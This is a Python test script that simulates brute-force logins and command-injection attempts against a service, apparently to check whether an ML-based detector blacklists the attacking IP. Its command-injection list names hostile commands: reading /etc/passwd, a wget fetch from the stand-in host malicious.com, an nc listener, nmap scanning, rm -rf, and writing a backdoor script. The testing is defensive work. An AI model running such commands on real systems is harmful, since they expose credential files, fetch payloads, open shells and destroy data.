# ml_test.py
import socket
import random
import time
import sys

def simulate_attack(host='localhost', port=8080, attack_type='bruteforce'):
    """
    Simulate different attack types to trigger ML detection
    """
    print(f"Running {attack_type} attack simulation against {host}:{port}")
    
    # Update ml_test.py bruteforce test section
    if attack_type == 'bruteforce':
        # Rapid brute force login attempts
        for i in range(10):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)  # Longer timeout
                s.connect((host, port))
                
                # Get welcome message
                welcome = s.recv(4096).decode('utf-8', errors='ignore')
                print(f"Welcome message received ({len(welcome)} bytes)")
                
                # Send username with newline
                username = f"attacker{random.randint(1000, 9999)}"
                print(f"Sending username: {username}")
                s.sendall((username + "\n").encode())
                
                # Wait for password prompt
                time.sleep(0.5)
                prompt = s.recv(4096).decode('utf-8', errors='ignore')
                
                # Send password with newline
                password = f"password{random.randint(1000, 9999)}"
                print(f"Sending password: {password}")
                s.sendall((password + "\n").encode())
                
                # Get response with longer timeout
                s.settimeout(5)
                try:
                    response = s.recv(4096).decode('utf-8', errors='ignore')
                    print(f"Login attempt {i+1}: {username}/{password}")
                    print(f"Response: {response.strip()}")
                    
                    if "blacklisted" in response.lower():
                        print("⚠️ IP has been blacklisted!")
                        break
                except socket.timeout:
                    print("Timeout waiting for response")
                    
                s.close()
                time.sleep(1)  # Longer delay between attempts
            except Exception as e:
                print(f"Error: {e}")
    
    elif attack_type == 'command_injection':
        # Try to establish a session
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            
            # Skip welcome message
            s.recv(4096)
            
            # Send valid credentials
            s.sendall(b"admin")
            s.recv(4096)
            s.sendall(b"wrong_password")
            s.recv(4096)
            
            # Send suspicious commands in rapid succession
            attack_commands = [
                "cat /etc/passwd",
                "wget http://malicious.com/payload",
                "ls -la /etc",
                "ping -c 100 192.168.1.1",
                "nmap -sS 192.168.1.0/24",
                "nc -lvp 4444",
                "rm -rf /tmp/*",
                "echo 'malicious script' > backdoor.sh"
            ]
            
            for cmd in attack_commands:
                s.sendall(cmd.encode())
                try:
                    response = s.recv(4096).decode('utf-8', errors='ignore')
                    print(f"Command: {cmd}")
                    
                    if "blacklisted" in response.lower():
                        print("⚠️ IP has been blacklisted by ML model!")
                        break
                except socket.timeout:
                    print("Response timeout (connection may have been terminated)")
                    break
                
                time.sleep(0.2)
            
            s.close()
        except Exception as e:
            print(f"Error: {e}")
    
    print("Attack simulation completed")

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    attack = sys.argv[3] if len(sys.argv) > 3 else 'bruteforce'
    
    simulate_attack(host, port, attack)